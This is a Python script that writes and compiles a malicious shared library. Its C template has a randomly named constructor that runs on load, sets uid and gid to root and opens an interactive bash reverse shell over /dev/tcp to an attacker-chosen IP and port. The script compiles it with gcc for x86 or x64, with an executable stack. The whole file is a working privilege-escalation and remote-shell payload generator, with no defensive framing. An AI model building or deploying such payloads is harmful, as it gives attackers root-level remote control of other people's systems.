#!/usr/bin/env python3

import random
import string
from argparse import ArgumentParser
import os


def make_random_str():
    nbr = random.randint(8, 35)
    random_str = ''.join(random.choice(string.ascii_letters) for i in range(nbr))
    return random_str


def get_template(ip_address, port):
    constructor = make_random_str()

    return '''
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h> 

    static void {constructor}() __attribute__((constructor));
        
    void {constructor}() {{
        setuid(0);
        setgid(0);
        system("/bin/bash -c '/bin/bash -i >& /dev/tcp/{ip_address}/{port} 0>&1'");
    }}
    '''.format(
        constructor=constructor,
        ip_address=ip_address,
        port=port,
    )


def make_dir(out_dir):
    the_path = "./out/%s" % out_dir
    os.mkdir(the_path)
    return the_path


def write_template(out_dir, template):
    the_path = "%s/template.c" % out_dir
    with open(the_path, 'w') as f:
        f.write(template)


def compile_payload(out_dir, arch):
    m = '-m32' if arch == 'x86' else '-m64'
    command = f'gcc {m} -Wall -fPIC -c -o {out_dir}/hax.o  {out_dir}/template.c -z execstack && gcc -shared -o {out_dir}/libhax.so {out_dir}/hax.o {m} -z execstack'
    os.system(command)


def make_c_shared(output_dir, ip_address, port, architecture):
    output_dir = make_dir(output_dir)
    template = get_template(ip_address, port)
    write_template(output_dir, template)
    compile_payload(output_dir, architecture)


def run():
    parser = ArgumentParser(usage="usage: %(prog)s [options]")

    parser.add_argument("-o",
                        help="Directory to save the output",
                        type=str,
                        dest="output_dir",
                        default="rv",
                        required=True)

    parser.add_argument("-a",
                        dest="architecture",
                        type=str,
                        default="x64",
                        help="architecture (x86, x64)"
                        )

    parser.add_argument("-i",
                        dest="ip_address",
                        type=str,
                        help="ip address"
                        )

    parser.add_argument("-p",
                        dest="port",
                        type=str,
                        help="port"
                        )

    user_arguments = parser.parse_args()
    make_c_shared(
        user_arguments.output_dir,
        user_arguments.ip_address,
        user_arguments.port,
        user_arguments.architecture,
    )


if __name__ == '__main__':
    run()
